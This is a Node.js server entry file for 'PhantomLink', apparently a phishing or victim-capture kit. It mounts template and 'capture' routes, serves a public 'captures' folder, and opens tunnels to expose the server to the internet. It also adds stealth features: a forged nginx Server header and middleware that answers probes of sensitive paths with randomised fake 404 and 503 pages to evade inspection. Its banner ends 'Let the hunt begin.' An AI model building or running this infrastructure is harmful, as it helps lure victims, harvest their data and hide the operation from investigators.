      import express from 'express';
      import { createServer } from 'http';
      import { Server as SocketIOServer } from 'socket.io';
      import helmet from 'helmet';
      import compression from 'compression';
      import cors from 'cors';
      import pico from 'picocolors';
      import { join, dirname } from 'path';
      import { fileURLToPath } from 'url';
      import { readFileSync, existsSync, mkdirSync } from 'fs';

      import { loadConfig } from '../utils/helpers.js';
      import { initSocket } from './socket.js';
      import { startTunnels } from './tunnels.js';
      import templateRoutes from '../routes/templates.js';
      import captureRoutes from '../routes/capture.js';

      const __filename = fileURLToPath(import.meta.url);
      const __dirname = dirname(__filename);
      const ROOT = join(__dirname, '..', '..');

      const config = loadConfig();
      const app = express();

      let httpServer;
      let serverPort = config.server.port || 3000;
      let protocol = 'http';

      if (config.https?.enabled) {
        const certPath = join(ROOT, 'cert', 'cert.pem');
        const keyPath = join(ROOT, 'cert', 'key.pem');

        if (existsSync(keyPath) && existsSync(certPath)) {
          const { createServer: createHttpsServer } = await import('https');
          const key = readFileSync(keyPath);
          const cert = readFileSync(certPath);

          httpServer = createHttpsServer({ key, cert }, app);
          serverPort = config.https.port || 443;
          protocol = 'https';
          console.log(pico.green('   HTTPS enabled with self-signed certificate'));
        } else {
          console.log(pico.yellow('   HTTPS enabled in config but certificates not found. Using HTTP.'));
          httpServer = createServer(app);
        }
      } else {
        httpServer = createServer(app);
        console.log(pico.dim('   HTTPS disabled (config.https.enabled = false)'));
      }

      const io = new SocketIOServer(httpServer, {
        cors: { origin: "*", methods: ["GET", "POST"] },
        maxHttpBufferSize: 1e8
      });

      app.use(helmet({
        contentSecurityPolicy: false,
        crossOriginEmbedderPolicy: false
      }));
      app.use(compression());
      app.use(cors());
      app.use(express.json({ limit: '10mb' }));
      app.use(express.urlencoded({ extended: true, limit: '10mb' }));

      if (config.stealth?.fakeUserAgent) {
        app.use((req, res, next) => {
          res.setHeader('Server', 'nginx');
          res.removeHeader('X-Powered-By');
          next();
        });
      }

      app.use((req, res, next) => {
        const suspiciousPaths = [
          '/capture', '/admin', '/.env', '/config', '/api', '/socket.io', '/debug', '/git', '/svn', '/server.js'
        ];

        if (suspiciousPaths.some(path => req.path.toLowerCase().startsWith(path)) && req.method !== 'POST') {
          if (Math.random() < 0.5) {
            return res.status(404).send(`
              <html><head><title>404 Not Found</title></head>
              <body style="background:#fff;color:#333;font-family:Arial;text-align:center;padding:100px;">
                <h1>404 Not Found</h1>
                <p>The requested URL was not found on this server.</p>
              </body></html>
            `);
          } else {
            return res.status(503).send(`
              <html><head><title>503 Service Unavailable</title></head>
              <body style="background:#fff;color:#333;font-family:Arial;text-align:center;padding:100px;">
                <h1>503 Service Unavailable</h1>
                <p>The server is temporarily unavailable.</p>
              </body></html>
            `);
          }
        }
        next();
      });

      app.use('/public', express.static(join(ROOT, 'public'), { maxAge: '1d', etag: true }));
      app.use('/captures', express.static(join(ROOT, 'captures')));

      if (config.admin?.enabled) {
        app.use('/dashboard', (req, res, next) => {
          const auth = req.headers.authorization;
          if (auth && auth === 'Basic ' + Buffer.from(`admin:${config.admin.password}`).toString('base64')) {
            return next();
          }

          res.set('WWW-Authenticate', 'Basic realm="PhantomLink Admin Panel"');
          return res.status(401).send(`
            <div style="background:#000;color:#0f0;font-family:monospace;padding:100px;text-align:center;">
              <h1>401 Unauthorized</h1>
              <p>Acceso restringido al panel de administración.</p>
            </div>
          `);
        });
      }

      app.get('/dashboard', (req, res) => {
        res.sendFile(join(ROOT, 'public', 'dashboard.html'));
      });

      app.use('/', templateRoutes);
      app.use('/', captureRoutes);

      app.use((req, res) => {
        res.status(404).send(`
          <div style="background:#000;color:#0f0;font-family:monospace;padding:100px;text-align:center;">
            <h1>404 — Page Not Found</h1>
            <p>PhantomLink is running. This endpoint does not exist.</p>
          </div>
        `);
      });

      process.on('SIGTERM', shutdown);
      process.on('SIGINT', shutdown);

      function shutdown() {
        console.log('\nShutting down gracefully...');
        httpServer.close(() => process.exit(0));
      }

      httpServer.listen(serverPort, config.server.host || '0.0.0.0', () => {
        let banner;
        try {
          banner = readFileSync(join(ROOT, 'config', 'banner.txt'), 'utf-8');
        } catch {
          banner = '\nPhantomLink v2.0 — Starting...\n';
        }

        console.clear();
        console.log(banner);

        const portDisplay = serverPort === 80 || serverPort === 443 ? '' : `:${serverPort}`;

        console.log(pico.cyan('   ┌──────────────────────────────────────────────────────┐'));
        console.log(pico.cyan('   │ ') + pico.bold('ACCESS LINKS') + pico.cyan('                                         │'));
        console.log(pico.cyan('   ├──────────────────────────────────────────────────────┤'));
        console.log(pico.cyan('   │ ') + pico.white('Local server    → ') + pico.underline(pico.blue(`${protocol}://localhost${portDisplay}`)) + pico.cyan('             │'));
        console.log(pico.cyan('   │ ') + pico.white('Admin Dashboard → ') + pico.underline(pico.blue(`${protocol}://localhost${portDisplay}/dashboard`)) + pico.cyan('   │'));
        console.log(pico.cyan('   └──────────────────────────────────────────────────────┘\n'));

        initSocket(io);
        startTunnels(serverPort, config);

        console.log(`\nPhantomLink 1.0.0     READY — Let the hunt begin.\n`);
      });

      export { app, httpServer, io };